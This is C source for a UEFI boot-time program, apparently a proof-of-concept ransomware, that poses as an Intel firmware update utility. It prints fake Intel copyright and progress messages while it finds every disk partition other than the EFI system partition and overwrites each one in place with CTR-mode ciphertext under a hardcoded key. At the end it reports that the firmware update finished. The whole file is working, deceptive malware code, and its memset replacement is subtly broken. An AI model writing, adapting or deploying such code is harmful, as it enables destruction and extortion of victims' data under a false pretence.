#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/PrintLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>
#include <Library/UefiDevicePathLib/UefiDevicePathLib.h>
#include <Protocol/BlockIo.h>
#include <Protocol/DiskIo.h>
#include <Protocol/LoadedImage.h>
#include <Guid/GlobalVariable.h>
#include <Library/BaseMemoryLib.h>
#include <Library/RamielLib.h>

// fix for weird linker error
void *memset(void *ptr, int value, UINTN num) {
    if (ptr == NULL) {
        return NULL;
    }
    char *ptr_char = (char *) ptr;
    while(*ptr_char && num > 0) {
      *ptr_char = value;
      ptr_char++;
      num--;
    }
    return ptr;
}

BOOLEAN device_path_equals(EFI_DEVICE_PATH_PROTOCOL *a, EFI_DEVICE_PATH_PROTOCOL *b);

EFI_STATUS EFIAPI UefiEntry(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE* SystemTable) {
    gST = SystemTable;
    gBS = SystemTable->BootServices;
    gRT = SystemTable->RuntimeServices;
    gImageHandle = ImageHandle;
    gBS->SetWatchdogTimer(0, 0, 0, NULL);

    EFI_STATUS status;

    Print(L"Intel (R) Firmware Update Utility Version: 11.8.50.3425\n");
    Print(L"Copyright (C) 2007 - 2022, Intel Corporation. All rights reserved.\n\n");
    Print(L"!! WARNING !! DO NOT POWER OFF THE MACHINE BEFORE THE FIRMWARE UPDATE PROCESS ENDS.\n");
    Print(L"Communication Mode: MEI\n\n");
    Print(L"Checking firmware parameters... [done]\n");
    Print(L"Updating firmware image, this may take a while... ");

    unsigned char key[] = {'d', 'd', 'd', 'd', 'd', 'd', 'd', 'd', 'd', 'd', 'd', 'd', 'd', 'd', 'd', 'd'};
    unsigned char iv[] = {'d', 'd', 'd', 'd', 'd', 'd', 'd', 'd'};

    EFI_GUID loaded_image_device_path_protocol_guid = EFI_LOADED_IMAGE_DEVICE_PATH_PROTOCOL_GUID;
    EFI_DEVICE_PATH_PROTOCOL *esp_path;

    status = gBS->HandleProtocol(
        ImageHandle,
        &loaded_image_device_path_protocol_guid,
        (void *) &esp_path);

    EFI_DEVICE_PATH_PROTOCOL *curr = esp_path;
    EFI_DEVICE_PATH_PROTOCOL *prev = NULL;
    EFI_DEVICE_PATH_PROTOCOL *prev_prev = NULL;
    while (!IsDevicePathEnd(curr)) {
        EFI_DEVICE_PATH_PROTOCOL *tmp = curr;
        curr = NextDevicePathNode(curr);
        prev = tmp;
        if (prev) {
            prev_prev = prev;
        }
    }
    SetDevicePathEndNode(prev_prev);

    EFI_BLOCK_IO *blockio;
    EFI_HANDLE *blockio_device_handles;
    UINTN blockio_handle_count;
    EFI_GUID blockio_guid = EFI_BLOCK_IO_PROTOCOL_GUID;

    status = gBS->LocateHandleBuffer(
        ByProtocol,
        &blockio_guid,
        NULL,
        &blockio_handle_count,
        &blockio_device_handles);
    if (EFI_ERROR(status) || blockio_handle_count == 0) {
        return status;
    }

    EFI_DISK_IO *diskio;
    EFI_GUID diskio_guid = EFI_DISK_IO_PROTOCOL_GUID;

    for (int i = 0; i < blockio_handle_count; i++) {
        EFI_DEVICE_PATH_PROTOCOL *path = DevicePathFromHandle(((EFI_HANDLE **) blockio_device_handles)[i]);
        if (device_path_equals(path, esp_path) == TRUE) {
            continue;
        }

        status = gBS->OpenProtocol(
            ((EFI_HANDLE **) blockio_device_handles)[i],
            &blockio_guid,
            (void **) &blockio,
            gImageHandle,
            NULL,
            EFI_OPEN_PROTOCOL_BY_HANDLE_PROTOCOL);
        if (EFI_ERROR(status) || blockio == NULL || blockio->Media->BlockSize == 0) {
            Print(L"DEBUG: failed opening blockio protocol\n");
            continue;
        }

        if (blockio->Media->LogicalPartition == TRUE) {
            status = gBS->OpenProtocol(
                ((EFI_HANDLE **) blockio_device_handles)[i],
                &diskio_guid,
                (void **) &diskio,
                gImageHandle,
                NULL,
                EFI_OPEN_PROTOCOL_BY_HANDLE_PROTOCOL);
            if (EFI_ERROR(status) || diskio == NULL) {
                return status;
            }

            void *in_buf = AllocatePages(EFI_SIZE_TO_PAGES(SIZE_2MB));
            void *out_buf = AllocatePages(EFI_SIZE_TO_PAGES(SIZE_2MB));

            init_iv_ctr(iv);
            init_state_ctr();
            init_key_ctr(key);

            UINT64 offset = 0;
            while (1) {
                status = diskio->ReadDisk(diskio, blockio->Media->MediaId, offset, SIZE_2MB, in_buf);
                if (EFI_ERROR(status)) {
                    break;
                }

                // use EVP for fast encryption
                encrypt_block_ctr(in_buf, out_buf, SIZE_2MB);

                status = diskio->WriteDisk(diskio, blockio->Media->MediaId, offset, SIZE_2MB, out_buf);
                if (EFI_ERROR(status)) {

                }
                offset += SIZE_2MB;
            }

            FreePages(in_buf, EFI_SIZE_TO_PAGES(SIZE_2MB));
            FreePages(out_buf, EFI_SIZE_TO_PAGES(SIZE_2MB));
        }
    }
    Print(L"[done]\n");
    Print(L"Finished updating firmware.\n");

    FreePages(blockio_device_handles, EFI_SIZE_TO_PAGES(blockio_handle_count));

    return status;
}


BOOLEAN device_path_equals(EFI_DEVICE_PATH_PROTOCOL *a, EFI_DEVICE_PATH_PROTOCOL *b) {
    if (GetDevicePathSize(a) != GetDevicePathSize(b)) {
        return FALSE;
    }
    if (CompareMem(a, b, GetDevicePathSize(a)) == 0) {
        return TRUE;
    }
    return FALSE;
}
